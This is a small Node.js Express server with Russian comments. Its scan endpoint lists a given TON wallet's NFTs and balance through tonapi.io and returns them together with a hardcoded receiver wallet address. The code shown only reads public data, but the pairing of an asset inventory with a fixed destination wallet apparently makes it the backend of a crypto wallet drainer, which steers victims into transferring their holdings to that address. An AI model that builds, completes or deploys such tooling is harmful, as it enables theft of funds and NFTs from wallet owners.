import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());

const TONAPI = 'https://tonapi.io/v2';
const RECEIVER = process.env.RECEIVER_TON || 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4';

app.post('/api/scan', async (req, res) => {
  const { address } = req.body;
  if (!address) return res.status(400).json({ error: 'no address' });

  try {
    // Параллельно тянем NFT и инфу об аккаунте
    const [nftsRes, accRes] = await Promise.all([
      fetch(TONAPI + '/accounts/' + encodeURIComponent(address) + '/nfts'),
      fetch(TONAPI + '/accounts/' + encodeURIComponent(address)),
    ]);

    const nftsData = await nftsRes.json();
    const accData = await accRes.json();

    const nfts = (nftsData.nft_items || [])
      .filter(n => n.owner && n.owner.address === address)
      .map(n => ({
        address: n.address,
        collection: n.collection && n.collection.address,
        collectionName: (n.collection && n.collection.name) || 'NFT',
        name: (n.metadata && n.metadata.name) || (n.collection && n.collection.name) || 'NFT',
        image: (n.metadata && n.metadata.image) || '',
        index: n.index,
      }));

    const balance = accData.balance || 0; // в nanoTON

    res.json({
      receiver: RECEIVER,
      balance: balance,
      balanceTon: (balance / 1e9).toFixed(4),
      nfts: nfts,
    });
  } catch (e) {
    res.status(500).json({ error: String(e) });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => console.log('scan api on :' + PORT));
